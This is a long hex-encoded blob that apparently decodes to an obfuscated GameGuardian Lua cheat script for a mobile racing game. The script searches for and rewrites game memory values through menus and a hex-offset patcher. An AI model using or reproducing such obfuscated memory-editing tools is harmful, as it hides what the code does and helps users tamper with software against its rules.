D4F52614E2D2D2D472D504E5F2D5D4E5F58565B54697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2DFDAAA1CAEF91AAFDAAA293FDAAA2912DFDAAA28DEF91A2FDAAA1C8FDAAA293EF91A2FDAAA1C9FDAAA297FDAAA28DFDAAA1C52D2D2D2D2D472DFDAC94BBFDAC94B6697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2DEFA18EEFA18DEFA18EEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEDC9C7EEC19485D6B7EEC1A8EDC9C8EFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18EEFA18DEFA18E2F362D2D1A1774743B807972727D35423D3D361A1774743B807281637680766F797235817F8272361A172D2D7C803B7285768135361A172D2D727B711A171A177D7F7C747F6E7A2D4A2D3F2D1A171A1774743B817C6E8081352F5D5F5260602D54542D595C545C2F361A171A171A171A171A171A1773827B7081767C7B2D7A6E767B5A727B8235361A1774743B807281637680766F797235736E798072361A17797C706E792D8072816376804A74743B807281637680766F79721A17797C706E792D76806376804A74743B7680637680766F79721A17797C706E792D80757C847A727B824A736E7980721A1780728163768035736E798072361A171A1784757679722D817F82722D717C1A172D2D2D2D76732D768063768035362D4A4A2D817F82722D8175727B1A172D2D2D2D2D2D80757C847A727B824A817F82721A172D2D2D2D2D2D80728163768035736E798072361A172D2D2D2D727B711A172D2D2D2D76732D80757C847A727B824A4A817F82722D8175727B1A172D2D2D2D2D2D80757C847A727B824A736E7980721A1773767F80815A727B822D4A2D74743B7A8279817650757C76707235882F5B4E5B2D615C64565B542F392F5B5C5F5A4E592D332D4E50615663522F392FEFAA9952655661EFAA992F8A397B7679392F507F726E812D4F862D7D7F7C747F6E7A6C6F72816E2F361A1776732D73767F80815A727B822D4A4A2D7B76792D8175727B1A1774743B817C6E8081352F697BEFA7ADFCC59CFDAA9D9FFDAA9DA9FDAA9DB8FDAA9DAFFDAA9DB6FDAA9DBA2DFDAA9DA8FDAA9DBF2D472D7D7F7C747F6E7A2D6F72816EEFA7ADFCC59C697B2D697BFDAAA78FFDAAA791FDAAA6BEFDAAA78FFDAAA6BFFDAAA78EFDAAA6C5FDAAA6BEFDAAA6C12DFDAAA6C2FDAAA6CBFDAAA78E2DFDAAA6C9FDAAA6CBFDAAA78EFDAAA6C12DFDAAA78FFDAAA6BFFDAAA78EFDAAA6C5FDAAA6CCFDAAA7902DFDAAA6C4FDAAA6BDFDAAA6BFFDAAA6C72DFDAAA791FDAAA6CCFDAAA6C0FDAAA6BDFDAAA790FDAAA6C1FDAAA78F2F361A177A6E767B5A727B8235361A17727B711A1776732D73767F80815A727B82683E6A2D8175727B1A177075726E816C3E35361A17727B711A1776732D73767F80815A727B82683F6A2D8175727B1A1780826F5A727B8235361A17727B711A1776732D73767F80815A727B8268406A2D8175727B1A1780728163768035736E798072361A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A1774743B807972727D353F3D3D361A1774743B817C6E8081352FFDAA9DA02F361A1774743B817C6E8081352F7D7F7C747F6E7A2D6F72816E2F361A1774743B7079726E7F5F728082798180353674743B7079726E7F5976808135361A177D7F767B81357C803B716E8172352FFDAC91C0FDAC91CBFDAC91CAFDAC9290CFADFDAC91C2FDAC91CBFDAC928EFDAC91C3FDAC91C1FDAC9290CFADFDAC9290FDAC91CBCFADFDAC928FFDAC9291FDAC91BEFDAC928FFDAC91BFFDAC928EFDAC91C5FDAC91BEFDAC91C1CFADFDAC91BEFDAC928EFDAC91CB697B697BEF9CBEFCC59C2D617C716E862D472D32663C327A3C32712D61767A72472D325547325A4732602DEF9CBEFCC59C697B697B2F36361A177D7F767B81352F2D2D2D2D2D2D2D2DEFABB42DEFA095EFA09FEFA0AEEFA0A5EFA0ACEFA0B02DEFABAD697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2DFDAAA29DFDAAA293FDAAA299FDAAA298FDAAA299FDAAA1C6FDAAA1C92DEF918FEF919AFDAAA1C5EF91A2EF91A2FDAAA1C9FDAAA2902D2D2D472D706E7F2D7D6E7F78767B74697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2DFDAAA1CAEF91AAFDAAA293FDAAA2912DFDAAA28DEF91A2FDAAA1C8FDAAA293EF91A2FDAAA1C9FDAAA297FDAAA28DFDAAA1C52D2D2D2D2D472DFDAC94BBFDAC94B6697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2DEFA18EEFA18DEFA18EEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEDC9C7EEC19485D6B7EEC1A8EDC9C8EFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18DEFA18EEFA18DEFA18E2F362D2D1A1774743B807972727D35423D3D361A1780728163768035817F8272362D1A177C803B7285768135361A17727B711A17727B711A17727B711A17727B711A171A171A1773827B7081767C7B2D7075726E816C3E35361A177D7F7C747F6E7A81352F5A82798176517F6E745F6E70767B74507C7B817F7C79792F392D2F3D8553502F392D736E798072392D736E798072392D74743B61665D526C53595C4E61361A1774743B7472815F7280827981803546464646361A17797C706E792D812D4A2D74743B7472815F728082798180353F361A172D2D2D74743B6E7171597680815681727A803581361A172D2D2D2D2D2D2D812D4A2D7B76791A172D2D2D2D2D2D2D74743B807281637680766F797235736E798072362D2D2D2D2D2D1A172D2D2D2D2D2D2D2D2D2D7F7283727F812D4A2D74743B747281597680815681727A8035361A17797C706E792D812D4A2D74743B747281597680815681727A8035361A17737C7F2D76392D832D767B2D767D6E767F803581362D717C1A171676732D833B73796E74802D4A4A2D74743B61665D526C53595C4E612D8175727B1A171616833B836E7982722D4A2D2F42424242422F1A171616833B737F727287722D4A2D736E7980721A171616833B737F7272877261867D722D4A2D74743B535F525267526C5B5C5F5A4E591A1716727B711A17727B711A1774743B6E7171597680815681727A803581361A17812D4A2D7B76791A171A177C2D4A2D74743B7472815F728082798180353E361A171A17797C706E792D6F2D4A2D888A1A176F683E6A2D4A2D888A1A176F683E6A3B6E71717F7280802D4A2D7C683E6A3B6E71717F7280802D382D3D85403D1A176F683E6A3B73796E74802D4A2D74743B61665D526C53595C4E611A176F683E6A3B836E7982722D4A2D453D45451A176F683E6A3B737F727287722D4A2D817F82721A1716166F683E6A3B737F7272877261867D722D4A2D74743B535F525267526C5B5C5F5A4E591A1774743B807281636E79827280356F362D1A1774743B6E7171597680815681727A80356F361A176F2D4A2D7B76791A1774743B7D7F7C707280805F7280827A7235361A171A17782D4A2D74743B7472815F728082798180353E361A171A17797C706E792D792D4A2D888A1A1779683E6A2D4A2D888A1A1779683E6A3B6E71717F7280802D4A2D78683E6A3B6E71717F7280802D382D3D853F411A1779683E6A3B73796E74802D4A2D74743B61665D526C53595C4E611A1779683E6A3B836E7982722D4A2D3D1A1779683E6A3B737F727287722D4A2D817F82721A17161679683E6A3B737F7272877261867D722D4A2D74743B535F525267526C5B5C5F5A4E591A1774743B807281636E798272803579362D1A1774743B6E7171597680815681727A803579361A17792D4A2D7B76791A1774743B7D7F7C707280805F7280827A7235361A171A171A17842D4A2D74743B7472815F728082798180353E361A171A17797C706E792D7E2D4A2D888A1A177E683E6A2D4A2D888A1A177E683E6A3B6E71717F7280802D4A2D84683E6A3B6E71717F7280802D382D3D853E451A177E683E6A3B73796E74802D4A2D74743B61665D526C53595C4E611A177E683E6A3B836E7982722D4A2D3A464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646464646461A177E683E6A3B737F727287722D4A2D817F82721A1716167E683E6A3B737F7272877261867D722D4A2D74743B535F525267526C5B5C5F5A4E591A1774743B807281636E79827280357E362D1A1774743B6E7171597680815681727A80357E361A177E2D4A2D7B76791A1774743B7079726E7F5F72808279818035361A1774743B807281637680766F797235736E798072361A1774743B817C6E8081352FFDAA9D8DFDAA9DA9FDAA9DBAFDAA9DAFFDAA9DBCFDAA9DA7FDAA9DBAFDAA9DAB2F361A1780826F5A727B8235361A1774743B817C6E8081352F7D7F7280802D54542D597C747C2F361A17727B711A171A1773827B7081767C7B2D80826F5A727B8235361A1774743B807281637680766F797235736E798072361A17797C706E792D8072816376804A74743B807281637680766F79721A17797C706E792D76806376804A74743B7680637680766F79721A17797C706E792D80757C847A727B824A736E7980721A1780728163768035736E798072361A171A171A1784757679722D817F82722D717C1A172D2D76732D74743B7680637680766F797235364A4A736E7980722D8175727B1A172D2D2D2D7C7F71727F4A74743B6E79727F81352FFDAA9D8FFDAA9DB8FDAA9DABFDAA9DA7FDAA9DBA2DFDAA9DA8FDAA9DBF2D472D7C7987756E802D746E7A722F392F4E708176836E81722F392F5B7C7F7A6E792F361A172D2D2D2D76732D7C7F71727F2D4A4A2D3E2D8175727B2D1A172D2D2D2D2D2D747C817C2D706E6E7F761A172D2D2D2D7279807276732D7C7F71727F2D4A4A2D3F2D8175727B1A172D2D2D2D747C817C2D7B7C7F7A6E791A172D2D2D2D727B711A172D2D727B711A17727B711A171A174747706E6E7F7647472D717C1A1774743B7079726E7F5F72808279818035361A1774743B2D8072815F6E7B7472803574743B5F5254565C5B6C4E5B5C5B665A5C6260361A1774743B2D7079726E7F5F72808279818035361A1774743B80726E7F70755B827A6F727F352F3D3B4341443D423D3D3F403D45483D3B46443D3D3D3D3D3F45433E483E3B4445443D464340453E3E46483D3B42423D414342453F3F3F3F4740402F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A1774743B7F7273767B725B827A6F727F352F3D3B4341443D423D3D3F403D452F3974743B61665D526C53595C4E61361A177F7283727F812D4A2D74743B7472815F728082798180354646464646392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F4046452F392D74743B61665D526C53595C4E61361A171A1774743B817C6E8081352F5D5F5C545F4E5A2D7D7F7C747F6E7A2D505C594E4F2D515F4E542F361A1774743B807972727D35463D3D361A1774743B6E79727F81352F4E5F522D665C622D60625F522D4F5F5C6155525F2D545C2F361A1774743B807972727D353E3D3D361A1774743B6E79727F81352F4E5F522D665C622D5F524E51662F361A1774743B807972727D353F3D3D361A1774743B6E79727F81352F595C4E51565B542D535F4E5A522D5F4E50522D5F5C5C5A2F361A1774743B807972727D35403D3D361A1774743B7079726E7F5F72808279818035361A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C505C51526C4E5D5D362D1A1774743B80726E7F70755B827A6F727F352F423D3D2F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3A3F2F392D74743B61665D526C53595C4E61361A1774743B807972727D353F3D361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F423D3D2F392D74743B61665D526C53595C4E61361A1774743B7D7F7C707280805F7280827A7235361A1774743B7079726E7F5F72808279818035361A171A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C505C51526C4E5D5D361A1774743B80726E7F70755B827A6F727F352F3F3B3F3D3D3D3D3D3D4144434553483D3B3D42414646464646464453483E3B3D4241464646464144424253483F3B413D3D3D3D3D3D4642404453473E402F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A171A1774743B7F7273767B725B827A6F727F352F3F3B3F2F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A177F7283727F812D4A2D74743B7472815F7280827981803546464646392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F42422F392D74743B61665D526C53595C4E61361A1774743B7079726E7F5F72808279818035361A171A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C505C51526C4E5D5D361A1774743B80726E7F70755B827A6F727F352F3D3B3D3D3D3D3E2F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F422F392D74743B61665D526C53595C4E61361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3D3B3D3D3D3D3E2F392D74743B61665D526C53595C4E61361A1774743B7079726E7F5F72808279818035361A1774743B7D7F7C707280805F7280827A7235361A1774743B817C6E8081352F5F524E51662D5F4E50522D2D4F5F5C6155525F2F361A1774743B807972727D35423D3D361A1774743B6E79727F81352F545C3B3B2D615C3B3B3B2D565B635661523B3B3B2D5F4E50523B3B3B2D4F5F5C6155525F3B3B3B2D5B5C6464642F361A1774743B807972727D353E423D3D361A171A1774743B6E79727F81352F2D2D2D2D2D2D2D2D2D2D2DEFA19CEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA1A0697B697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D565B635661522D5F4E50522D4F5F5C6155525F2D5D5F5C545F4E5A2D4F52614E697B697B697B2D2D2D2D2D2D2D2D2D2D2DEFA1A4EFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA1A82F392FFDAAA6BDFDAAA6BFFDAAA790FDAAA6C5FDAAA792FDAAA6BDFDAAA790FDAAA6C12F361A1774743B817C6E8081352FFDAA9D8DFDAA9DA9FDAA9DBAFDAA9DAFFDAA9DBCFDAA9DA7FDAA9DBAFDAA9DAB2F361A1774743B807972727D35463D3D361A1774743B817C6E8081352FFDAA9D9FFDAA9DA9FDAA9DB8FDAA9DAFFDAA9DB6FDAA9DBA2DFDAA9DA8FDAA9DBF2D472D7C7987756E802D746E7A722F361A171A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C4E5B5C5B665A5C6260361A1774743B80726E7F70755B827A6F727F352F423D3B41454446464546433F41484246413B41444646453D4143454442483D3B443D443E3D43453F454346483D3B443D443E3D43453F454346483E413B3F4544423D3D40453E4144483E413B3F4544423D3D40453E4144483E3B3D4740442F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A1774743B7F7273767B725B827A6F727F352F3E2F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A171A17797C706E792D812D4A2D74743B7472815F72808279818035423D3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3A3E3B3D462F392D74743B61665D526C53595C4E61361A1774743B7D7F7C707280805F7280827A7235361A177A6E767B5A727B8235361A17727B711A171A172D1A1747477B7C7F7A6E7947472D717C1A1776732D7F7283727F812D8B4A2D7B76792D8175727B2D74743B807281636E79827280357F7283727F81362D727B711A1774743B7079726E7F5F72808279818035361A1774743B817C6E8081352F5D5F5C545F4E5A2D7D7F7C747F6E7A2D505C594E4F2D515F4E542F361A1774743B807972727D35463D3D361A1774743B6E79727F81352F4E5F522D665C622D60625F522D4F5F5C6155525F2D545C2F361A1774743B807972727D353E3D3D361A1774743B6E79727F81352F4E5F522D665C622D5F524E51662F361A1774743B807972727D353F3D3D361A1774743B6E79727F81352F595C4E51565B542D535F4E5A522D5F4E50522D5F5C5C5A2F361A1774743B807972727D35403D3D361A1774743B7079726E7F5F72808279818035361A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C505C51526C4E5D5D362D1A1774743B80726E7F70755B827A6F727F352F423D3D2F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3A3F2F392D74743B61665D526C53595C4E61361A1774743B807972727D353F3D361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F423D3D2F392D74743B61665D526C53595C4E61361A1774743B7D7F7C707280805F7280827A7235361A1774743B7079726E7F5F72808279818035361A171A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C505C51526C4E5D5D361A1774743B80726E7F70755B827A6F727F352F42422F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A177F7283727F812D4A2D74743B7472815F7280827981803546464646392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3F3F2F392D74743B61665D526C53595C4E61361A1774743B7079726E7F5F72808279818035361A171A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C505C51526C4E5D5D361A1774743B80726E7F70755B827A6F727F352F422F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3D3B3D3D3D3D3E2F392D74743B61665D526C53595C4E61361A177F7283727F812D4A2D74743B7472815F728082798180353E3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3D3B3D3D3D3D3E2F392D74743B61665D526C53595C4E61361A1774743B7079726E7F5F72808279818035361A1774743B7D7F7C707280805F7280827A7235361A1774743B817C6E8081352F5F524E51662D5F4E50522D2D4F5F5C6155525F2F361A1774743B807972727D35423D3D361A1774743B6E79727F81352F545C3B3B2D615C3B3B3B2D565B635661523B3B3B2D5F4E50523B3B3B2D4F5F5C6155525F3B3B3B2D5B5C6464642F361A1774743B807972727D353E423D3D361A171A1774743B807281637680766F797235736E798072361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C4E5B5C5B665A5C6260361A1774743B80726E7F70755B827A6F727F352F3A3E3B3D462F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A1774743B7F7273767B725B827A6F727F352F3E2F392D74743B61665D526C53595C4E61392D736E798072392D74743B6056545B6C525E624E59392D3D392D3A3E392D3D361A171A17797C706E792D812D4A2D74743B7472815F72808279818035423D3D3D392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679392D7B7679361A1774743B727176814E7979352F3E2F392D74743B61665D526C53595C4E61361A1774743B7D7F7C707280805F7280827A7235361A1774743B6E79727F81352F2D2D2D2D2D2D2D2D2D2D2DEFA19CEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA1A0697B697B697B2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D5152505B5C5F5A4E59697B697B697B2D2D2D2D2D2D2D2D2D2D2DEFA1A4EFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA18EEFA1A82F392FFDAAA78EFDAAA6C1FDAAA78FFDAAA6C1FDAAA7902F361A1774743B817C6E8081352FFDAA9D90FDAA9DABFDAA9DA7FDAA9DA9FDAA9DBAFDAA9DAFFDAA9DBCFDAA9DA7FDAA9DBAFDAA9DAB2F361A1774743B807972727D35463D3D361A1774743B817C6E8081352FFDAA9D9FFDAA9DA9FDAA9DB8FDAA9DAFFDAA9DB6FDAA9DBA2DFDAA9DA8FDAA9DBF2D472D7C7987756E802D746E7A722F361A177A6E767B5A727B8235361A17727B711A17727B711A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A171A1773827B7081767C7B2D7D7F7C747F6E7A813570796E8080392D7C7373807281392D817F86556E7F71392D6F7681403F392D836E79827261867D72361A175472816C8280727F6C767B7D82812D4A2D888A1A175472816C8280727F6C767B7D8281683E6A2D4A2D70796E80801A175472816C8280727F6C767B7D8281683F6A2D4A2D7C73738072811A175472816C8280727F6C767B7D828168406A2D4A2D817F86556E7F711A175472816C8280727F6C767B7D828168416A2D4A2D6F7681403F1A175472816C8280727F6C81867D722D4A2D836E79827261867D721A1780816E7F8135361A17727B711A171A171A1773827B7081767C7B2D797C7C7D507572707835361A1776732D7D7F7C747F6E7A2D4A4A2D3E2D8175727B1A17625635361A177279807276732D727F7F7C7F2D4A4A2D402D8175727B1A1780817C7D50797C807235361A17727B711A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D737C827B716C357A7280806E7472361A1776732D727F7F7C7F2D4A4A2D3E2D8175727B1A17737C827B713F357A7280806E7472361A177279807276732D727F7F7C7F2D4A4A2D3F2D8175727B1A17737C827B7140357A7280806E7472361A177279807276732D727F7F7C7F2D4A4A2D402D8175727B1A17737C827B7141357A7280806E7472361A17727980721A17737C827B71357A7280806E7472361A17727B711A17727B711A171A171A171A171A171A1773827B7081767C7B2D737C827B71357A7280806E7472361A1776732D707C827B812D4A4A2D3D2D8175727B1A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A1773767F80816C727F7F7C7F2D4A2D7A7280806E74721A17727F7F7C7F2D4A2D3E1A178072707C7B716C80816E7F8135361A17727B711A17727B711A171A171A171A171A171A1773827B7081767C7B2D737C827B713F357A7280806E7472361A1776732D707C827B812D4A4A2D3D2D8175727B1A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A178072707C7B716C727F7F7C7F2D4A2D7A7280806E74721A17727F7F7C7F2D4A2D3F1A178175767F716C80816E7F8135361A17727B711A17727B711A171A171A171A171A171A1773827B7081767C7B2D737C827B7140357A7280806E7472361A1776732D707C827B812D4A4A2D3D2D8175727B1A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A178175767F716C727F7F7C7F2D4A2D7A7280806E74721A17727F7F7C7F2D4A2D401A17737C827F81756C80816E7F8135361A17727B711A17727B711A171A171A171A171A171A1773827B7081767C7B2D737C827B7141357A7280806E7472361A1776732D707C827B812D4A4A2D3D2D8175727B1A1774743B7079726E7F5F72808279818035361A1774743B7079726E7F5976808135361A1774743B6E79727F81352FEFAA99FDAAA6BDFDAAA6BFFDAAA790FDAAA6C5FDAAA792FDAAA6BDFDAAA790FDAAA6C12DFDAAA6C5FDAAA6CA2DFDAAA790FDAAA6C4FDAAA6C12DFDAAA78EFDAAA6CBFDAAA6CBFDAAA6C9EFAA992F361A1774743B807281637680766F797235817F8272361A17797C7C7D507572707835361A17727B711A17727B711A171A171A171A171A171A1773827B7081767C7B2D8280727F6C767B7D82816C816E78727F35361A17474780817C7F8147471A1774743B7079726E7F5F72808279818035361A1776732D7D7F7C747F6E7A2D4A4A2D3E2D8175727B1A1776732D5472816C8280727F6C767B7D82812D4A4A2D7B76792D8175727B1A177172736E8279813E2D4A2D2F5D796E86727F507C7B817F7C7979727F2F1A177172736E8279813F2D4A2D2F3D853E41452F1A177172736E827981402D4A2D736E7980721A177172736E827981412D4A2D736E7980721A17727980721A177172736E8279813E2D4A5472816C8280727F6C767B7D8281683E6A1A177172736E8279813F2D4A2D5472816C8280727F6C767B7D8281683F6A1A177172736E827981402D4A2D5472816C8280727F6C767B7D828168406A1A177172736E827981412D4A2D5472816C8280727F6C767B7D828168416A1A17727B711A175472816C8280727F6C767B7D82812D4A2D74743B7D7F7C7A7D81351A17882FFDACA1BD60707F767D812D4F86FDACA1BD472D7D7F7C747F6E7A697B697B50796E80802D5B6E7A72472D2F392D2F5C7373807281472D2F392F617F862D556E7F71727F2D3A3A357172707F726E8072802D6E7070827F6E7086362F392F617F862D537C7F2D403F2D6F76812F8A391A17887172736E8279813E397172736E8279813F397172736E82798140397172736E827981418A391A17882F817285812F392F817285812F392F70757270786F7C852F392F70757270786F7C852F8A361A1776732D5472816C8280727F6C767B7D82812D8B4A2D7B76792D8175727B1A1776732D355472816C8280727F6C767B7D8281683E6A2D4A4A2D2F2F362D7C7F2D355472816C8280727F6C767B7D8281683F6A2D4A4A2D2F2F362D8175727B1A1774743B6E79727F81352FEF91C6FCC59C2D517C7B34812D59726E83722D567B7D82812D4F796E7B78EF91C6FCC59C2F361A17747C817C2D80817C7F811A17727B711A17727980721A1774743B6E79727F81352FEF91C6FCC59C2D527F7F7C7F2D472D617F862D6E746E767B2DEF91C6FCC59C2F361A17747C817C2D80817C7F811A17727B711A175472816C8280727F6C81867D722D4A2D74743B70757C76707235882F3E3B2D4F8681722D3C2D4F7C7C79726E7B2F392F3F3B2D51847C7F712D3C2D403F2D6F76812D567B812F392F403B2D5E847C7F712D3C2D43412D6F76812D567B812F392F413B2D53797C6E812F392F423B2D517C826F79722F8A397B7679392FFDACA1BD60707F767D812D4F86FDACA1BD472D7D7F7C747F6E7A697B697BEF91C6FCC59C2D50757C7C80722D6175722D5C82817D82812D61867D722DEF91C6FCC59C2F361A1776732D5472816C8280727F6C81867D722D4A4A2D3E2D8175727B1A175472816C8280727F6C81867D722D4A2D74743B61665D526C4F6661521A177279807276732D5472816C8280727F6C81867D722D4A4A2D3F2D8175727B1A175472816C8280727F6C81867D722D4A2D74743B61665D526C51645C5F511A177279807276732D5472816C8280727F6C81867D722D4A4A2D402D8175727B1A175472816C8280727F6C81867D722D4A2D74743B61665D526C5E645C5F511A177279807276732D5472816C8280727F6C81867D722D4A4A2D412D8175727B1A175472816C8280727F6C81867D722D4A2D74743B61665D526C53595C4E611A177279807276732D5472816C8280727F6C81867D722D4A4A2D422D8175727B1A175472816C8280727F6C81867D722D4A2D74743B61665D526C515C624F59521A17727B711A1776732D5472816C8280727F6C81867D722D8B4A2D74743B61665D526C4F6661522D8175727B1A1776732D355472816C8280727F6C767B7D8281683F6A2D322D41362D8B4A2D3D2D8175727B1A1774743B6E79727F81352FEF91C6FCC59C5572852D5C73738072812D5A8280812D4F722D4E7B2D5A827981767D79722D5C532D41EF91C6FCC59C2F361A17747C817C2D80817C7F811A17727B711A17727B711A17727B711A17727F7F7C7F2D4A2D3D2D1A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D5C6C767B7681766E796C80726E7F707535361A1774743B807281637680766F797235736E798072361A1774743B817C6E8081352FFDACACAF595C4E51565B542D472D53767F80812D617F862F361A178280727F6C767B7D82812D4A2D2F472F3B3B5472816C8280727F6C767B7D8281683E6A2D1A1776732D5472816C8280727F6C767B7D828168406A2D8175727B1A177C737380812D4A2D3F421A17727980721A177C737380812D4A2D3D1A17727B711A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D5C6C71767B7681766E796C80726E7F707535361A1776732D727F7F7C7F2D4B2D3E2D8175727B1A1774743B8072815F6E7B7472803574743B5F5254565C5B6C506C4E59595C50361A17727980721A1774743B8072815F6E7B7472803574743B5F5254565C5B6C5C6155525F361A17727B711A1774743B80726E7F70755B827A6F727F358280727F6C767B7D8281392D74743B61665D526C4F666152361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F5C6C71767B7681766E796C80726E7F70752F361A177F7281827F7B2D3D1A17727B711A175F7273767B727F2D4A2D74743B7472815F728082798180353E361A1774743B7F7273767B725B827A6F727F355F7273767B727F683E6A3B836E798272392D74743B61665D526C4F666152361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F5C6C71767B7681766E796C80726E7F70752F361A177F7281827F7B2D3D1A17727B711A17836E792D4A2D74743B7472815F72808279818035707C827B81361A1774743B6E7171597680815681727A8035836E79361A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D504E6C7D7C767B81727F6C80726E7F707535361A1774743B7079726E7F5F72808279818035361A1774743B8072815F6E7B7472803574743B5F5254565C5B6C506C4E59595C502D892D74743B5F5254565C5B6C5C6155525F361A1774743B797C6E715F7280827981803574743B747281597680815681727A803536361A1774743B80726E7F70755D7C767B81727F357C73738081361A17707C827B812D4A2D74743B7472815F728082798180507C827B8135361A1776732D707C827B812D4A4A2D3D2D8175727B1A17737C827B716C352F504E6C7D7C767B81727F6C80726E7F70752F361A177F7281827F7B2D3D1A17727B711A178372792D4A2D74743B7472815F72808279818035707C827B81361A1774743B7079726E7F5976808135361A1774743B6E7171597680815681727A8035837279361A17727B711A171A171A171A171A171A171A1773827B7081767C7B2D504E6C6E7D7D79866C7C737380728135361A1776732D5472816C8280727F6C767B7D828168416A2